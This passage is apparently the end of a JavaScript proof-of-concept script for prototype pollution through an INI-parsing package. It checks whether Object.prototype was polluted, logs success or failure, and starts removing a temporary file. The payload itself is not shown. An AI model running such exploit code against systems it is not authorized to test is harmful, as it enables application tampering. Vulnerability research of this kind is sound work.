  const isPolluted = Object.prototype.hasOwnProperty.call(Object.prototype, 'exploited');
  console.log(`[POC] Prototype pollution detected: ${isPolluted}`);

  if (isPolluted) {
    console.log(`[POC] SUCCESS: Object.prototype.exploited is now defined as: "${Object.prototype.exploited}"`);
  } else {
    console.log(`[POC] FAILURE: No pollution detected. The package may be patched.`);
  }

  // Cleanup temporary file to maintain a clean research environment
  if (fs.existsSync(iniPath)) {
